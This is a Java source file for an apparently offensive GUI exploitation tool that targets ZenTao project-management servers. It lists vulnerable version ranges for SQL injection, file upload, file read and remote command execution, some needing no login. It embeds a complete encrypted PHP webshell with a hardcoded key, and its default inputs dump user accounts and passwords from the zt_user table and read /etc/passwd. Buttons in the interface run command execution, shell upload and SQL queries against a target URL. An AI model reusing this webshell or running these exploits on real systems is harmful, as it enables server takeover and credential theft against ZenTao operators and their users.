package fun.fireline.controller;

import com.jfoenix.controls.JFXButton;
import com.jfoenix.controls.JFXTabPane;
import fun.fireline.core.Constants;
import fun.fireline.core.ExploitInterface;
import fun.fireline.core.VulCheckTask;
import fun.fireline.tools.Tools;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.scene.control.*;

import javafx.scene.input.MouseEvent;


/**
 * @author yhy
 * @date 2021/7/3 13:15
 * @github https://github.com/yhy0
 */

// JavaFX图形化界面的控制类
public class ZenTaoPMSController extends MainController{
    @FXML
    public JFXTabPane tabs;
    @FXML
    public TextField cookie;
    @FXML
    public JFXButton checkvul;
    @FXML
    private Tab cmd_execute;
    @FXML
    private Tab file_upload;
    @FXML
    private Tab sql_execute;
    @FXML
    private ChoiceBox<String> choice_cve;
    @FXML
    private ChoiceBox<String> platform;
    @FXML
    private TextArea basic_info;
    @FXML
    private TextArea cmd_info;
    @FXML
    private TextArea sql_info;
    @FXML
    public TextArea file_info;
    @FXML
    private TextField cmd;
    @FXML
    private TextField sql;
    @FXML
    public TextField filepath;
    @FXML
    private TextArea upload_info;
    @FXML
    private TextField upload_path;
    @FXML
    private TextArea upload_msg;
    @FXML
    private TextField url;

    private ExploitInterface ei;

    public static String BASICINFO = Constants.SECURITYSTATEMENT +

            "支持的漏洞: \r\n" +
            "\r\n"+
            "可利用版本: 8.2~9.21 \r\n"+
            "漏洞类型: sql注入 \r\n"+
            "是否需要认证: 普通用户\r\n"+
            "\r\n"+
            "可利用版本: 10.x~12.4.3\r\n"+
            "漏洞类型: 文件上传\r\n"+
            "是否需要认证: 管理员用户\r\n"+
            "\r\n"+
            "可利用版本: x~11.6\r\n"+
            "漏洞类型: sql注入\r\n"+
            "是否需要认证: 普通用户\r\n"+
            "\r\n"+
            "可利用版本: x~11.6\r\n"+
            "漏洞类型: 文件读取\r\n"+
            "是否需要认证: 普通用户\r\n"+
            "\r\n"+
            "可利用版本: x~11.6\r\n"+
            "漏洞类型: rce\r\n"+
            "是否需要认证: 普通用户\r\n"+
            "\r\n"+
            "可利用版本: 16.4~18.0.beta1\r\n"+
            "漏洞类型: sql注入\r\n"+
            "是否需要认证: 不需要认证\r\n"+
            "\r\n"+
            "可利用版本: 16.4~18.0.beta1\r\n"+
            "漏洞类型: rce\r\n"+
            "是否需要认证: 不需要认证\r\n" +

            Constants.UPDATEINFO;

    public static String[] ZenTaoPMS = {
            "all",
            "8.2~9.21 sql注入 普通用户",
            "10.x~12.4.3 文件上传 管理员用户",
            "x~11.6 sql注入 普通用户",
            "x~11.6 文件读取 普通用户",
            "x~11.6 rce 普通用户",
            "16.4~18.0.beta1 sql注入 不需要认证",
            "16.4~18.0.beta1 rce 不需要认证",
    };

    public static String SHELL = "<?php\n" +
            "@error_reporting(0);\n" +
            "session_start();\n" +
            "    $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n" +
            "\t$_SESSION['k']=$key;\n" +
            "\tsession_write_close();\n" +
            "\t$post=file_get_contents(\"php://input\");\n" +
            "\tif(!extension_loaded('openssl'))\n" +
            "\t{\n" +
            "\t\t$t=\"base64_\".\"decode\";\n" +
            "\t\t$post=$t($post.\"\");\n" +
            "\t\t\n" +
            "\t\tfor($i=0;$i<strlen($post);$i++) {\n" +
            "    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n" +
            "    \t\t\t}\n" +
            "\t}\n" +
            "\telse\n" +
            "\t{\n" +
            "\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n" +
            "\t}\n" +
            "    $arr=explode('|',$post);\n" +
            "    $func=$arr[0];\n" +
            "    $params=$arr[1];\n" +
            "\tclass C{public function __invoke($p) {eval($p.\"\");}}\n" +
            "    @call_user_func(new C(),$params);\n" +
            "?>\n";

    // 界面显示  一些默认的基本信息，漏洞列表、编码选项、线程、shell、页脚
    public void defaultInformation() {
        this.cmd_info.setWrapText(true);
        this.sql_info.setWrapText(true);
        this.file_info.setWrapText(true);

        this.choice_cve.setValue(ZenTaoPMS[0]);
        for (String cve : ZenTaoPMS) {
            this.choice_cve.getItems().add(cve);
        }

        ObservableList<Tab> tabs = this.tabs.getTabs();
        Tab cmd_execute = tabs.get(1);
        Tab file_upload = tabs.get(2);
        Tab sql_execute = tabs.get(3);
        Tab file_read = tabs.get(4);
        tabs.remove(cmd_execute);
        tabs.remove(file_upload);
        tabs.remove(sql_execute);
        tabs.remove(file_read);
        this.choice_cve.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
            @Override
            public void changed(ObservableValue<? extends Number> observable, Number oldValue, Number newValue) {
                tabs.remove(cmd_execute);
                tabs.remove(file_upload);
                tabs.remove(sql_execute);
                tabs.remove(file_read);
                if(newValue.intValue() == 0) {

                }else if(newValue.intValue() == 1){
                    tabs.add(sql_execute);
                }else if(newValue.intValue() == 2){
                    tabs.add(file_upload);
                }else if(newValue.intValue() == 3){
                    tabs.add(sql_execute);
                }else if(newValue.intValue() == 4){
                    tabs.add(file_read);
                }else if(newValue.intValue() == 5){
                    tabs.add(cmd_execute);
                }else if(newValue.intValue() == 6){
                    tabs.add(sql_execute);
                }else if(newValue.intValue() == 7){
                    tabs.add(cmd_execute);
                }
            }
        });

        SingleSelectionModel sm = this.tabs.getSelectionModel();
        checkvul.addEventHandler(MouseEvent.MOUSE_CLICKED, new EventHandler<MouseEvent>() {
                @Override
                public void handle(MouseEvent event) {
                    sm.select(0);
                }
            }
        );

        // 命令执行
        this.cmd_info.setText(" ");
        this.cmd_info.setWrapText(true);

        this.upload_msg.setText("在文件下载地址中填入url即可");

    }

    // 基本信息
    public void basic() {
        // 切换界面保留原来的记录
        // 基本信息的历史记录
        if(history.containsKey("ZenTaoPMS_url")) {
            this.url.setText((String) history.get("ZenTaoPMS_url"));
        }
        if(history.containsKey("ZenTaoPMS_vulName")) {
            this.choice_cve.setValue((String) history.get("ZenTaoPMS_vulName"));
        }
        if(history.containsKey("ZenTaoPMS_ei")) {
            this.ei = (ExploitInterface) history.get("ZenTaoPMS_ei");
        }
        if(history.containsKey("ZenTaoPMS_basic_info")) {
            this.basic_info.setText((String) history.get("ZenTaoPMS_basic_info"));
        } else {
            this.basic_info.setText(BASICINFO);
        }
        this.basic_info.setWrapText(true);

        // 命令执行的历史记录
        if(history.containsKey("ZenTaoPMS_cmd")) {
            this.cmd.setText((String) history.get("ZenTaoPMS_cmd"));
        }
        if(history.containsKey("ZenTaoPMS_sql")) {
            this.sql.setText((String) history.get("ZenTaoPMS_sql"));
        }
        if(history.containsKey("ZenTaoPMS_filepath")) {
            this.filepath.setText((String) history.get("ZenTaoPMS_filepath"));
        }
        if(history.containsKey("ZenTaoPMS_cmd_info")) {
            this.cmd_info.setText((String) history.get("ZenTaoPMS_cmd_info"));
        }
        if(history.containsKey("ZenTaoPMS_sql_info")) {
            this.sql_info.setText((String) history.get("ZenTaoPMS_sql_info"));
        }
        if(history.containsKey("ZenTaoPMS_file_info")) {
            this.file_info.setText((String) history.get("ZenTaoPMS_file_info"));
        }

        // 文件上传的历史记录
        if(history.containsKey("ZenTaoPMS_upload_info")) {
            this.upload_info.setText((String) history.get("ZenTaoPMS_upload_info"));
        }
        if(history.containsKey("ZenTaoPMS_upload_path")) {
            this.upload_path.setText((String) history.get("ZenTaoPMS_upload_path"));
        }
        if(history.containsKey("ZenTaoPMS_platform")) {
            this.platform.setValue((String) history.get("ZenTaoPMS_platform"));
        }
        if(history.containsKey("ZenTaoPMS_upload_msg")) {
            this.upload_msg.setText((String) history.get("ZenTaoPMS_upload_msg"));
        }
    }

    // 点击检测，获取url 和 要检测的漏洞
    @FXML
    public void check() {
        String url = Tools.urlParse(this.url.getText().trim());
        history.put("ZenTaoPMS_url", this.url.getText());
        String vulName = this.choice_cve.getValue().toString().trim();

        history.put("ZenTaoPMS_vulName", this.choice_cve.getValue());

        try {
            if (vulName.equals("all")) {
                this.basic_info.setText("");
                for (String vul : this.choice_cve.getItems()) {
                    if (!vul.equals("all")) {
                        VulCheckTask vulCheckTask = new VulCheckTask(this.url.getText(), vul);
                        vulCheckTask.messageProperty().addListener((observable, oldValue, newValue) -> {
                            this.basic_info.appendText("\t" + newValue + "\r\n\r\n");
                            if(newValue.contains("目标存在")) {
                                this.choice_cve.setValue(vul);
                                this.ei = Tools.getExploit(vul);
                                this.ei.checkVul(url);
                            }
                        });
                        (new Thread(vulCheckTask)).start();
                    }
                }
            } else {
                this.ei = Tools.getExploit(vulName);
                String result = this.ei.checkVul(url);

                this.basic_info.setText("\r\n\t" + result + "\r\n\r\n\t");

            }

        } catch (Exception e) {
            this.basic_info.setText("\r\n\t检测异常 \r\n\t\t\t" + e.toString());
        }

        history.put("ZenTaoPMS_ei", this.ei);

        history.put("ZenTaoPMS_basic_info", this.basic_info.getText());

    }

    // 命令执行
    @FXML
    public void get_execute_cmd() {
        String cmd = this.cmd.getText();
        String cookie = this.cookie.getText();
        String vulName = this.choice_cve.getValue().toString().trim();
        String url = Tools.urlParse(this.url.getText().trim());

        this.ei = Tools.getExploit(vulName);
        this.ei.checkVul(url);

        history.put("ZenTaoPMS_cmd", this.cmd.getText());

        if(cmd.length() == 0) {
            cmd = "whoami";
        }

        try {
            if(this.ei !=null && this.ei.isVul()) {
                String result = this.ei.exeCmd(cookie, cmd, null);
                this.cmd_info.setText(result);
            }else {
                this.cmd_info.setText("目标不存在此漏洞\r\n");
            }
        } catch (Exception var4) {
            this.cmd_info.setText("漏洞利用失败\r\n");
        }
        history.put("ZenTaoPMS_cmd_info", this.cmd_info.getText());
        this.ei = null;
    }


    // 点击上传文件，获取上传的文件信息
    @FXML
    public void get_shell_file() {
        String upload_path = this.upload_path.getText();
        String cookie = this.cookie.getText();
        String vulName = this.choice_cve.getValue().toString().trim();
        String url = Tools.urlParse(this.url.getText().trim());

        this.ei = Tools.getExploit(vulName);
        this.ei.checkVul(url);

        history.put("ZenTaoPMS_upload_path", this.upload_path.getText());

        if(upload_path.length() == 0) {
            upload_path = "http://yourhost:port/test.php";
        }

        try{
            if(this.ei !=null && this.ei.isVul()) {
                String result = this.ei.uploadFile(cookie, upload_path, "null");
                this.upload_msg.setText(result);
            }else {
                this.upload_msg.setText("目标不存在此漏洞\r\n");
            }
        } catch (Exception var4) {
            this.upload_msg.setText("漏洞利用失败\r\n");
        }
        history.put("ZenTaoPMS_upload_msg", this.upload_msg.getText());
        this.ei = null;
    }

    @FXML
    public void get_execute_sql() {
        String sql = this.sql.getText();
        String cookie = this.cookie.getText();
        String vulName = this.choice_cve.getValue().toString().trim();
        String url = Tools.urlParse(this.url.getText().trim());

        this.ei = Tools.getExploit(vulName);
        this.ei.checkVul(url);

        history.put("ZenTaoPMS_sql", this.sql.getText());

        if(sql.length() == 0) {
            sql = "select account,password from zt_user";
        }

        try {
            if(this.ei !=null && this.ei.isVul()) {
                String result = this.ei.exeSql(cookie, sql, null);
                this.sql_info.setText(result);

            }else {
                this.sql_info.setText("目标不存在此漏洞\r\n");
            }
        } catch (Exception var4) {
            this.sql_info.setText("漏洞利用失败\r\n");
        }
        history.put("ZenTaoPMS_sql_info", this.sql_info.getText());
        this.ei = null;
    }

    @FXML
    public void get_file_read(ActionEvent actionEvent) {
        String filepath = this.filepath.getText();
        String cookie = this.cookie.getText();
        String vulName = this.choice_cve.getValue().toString().trim();
        String url = Tools.urlParse(this.url.getText().trim());

        this.ei = Tools.getExploit(vulName);
        this.ei.checkVul(url);

        history.put("ZenTaoPMS_filepath", this.filepath.getText());

        if(filepath.length() == 0) {
            filepath = "/etc/passwd";
        }

        try {
            if(this.ei !=null && this.ei.isVul()) {
                String result = this.ei.readFile(cookie, filepath, null);
                this.file_info.setText(result);

            } else {
                this.file_info.setText("目标不存在此漏洞\r\n");
            }
        } catch (Exception var4) {
            this.file_info.setText("漏洞利用失败\r\n");
        }
        history.put("ZenTaoPMS_file_info", this.file_info.getText());
        this.ei = null;
    }

    // 加载
    public void initialize() {
        try {
            this.defaultInformation();
            this.basic();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
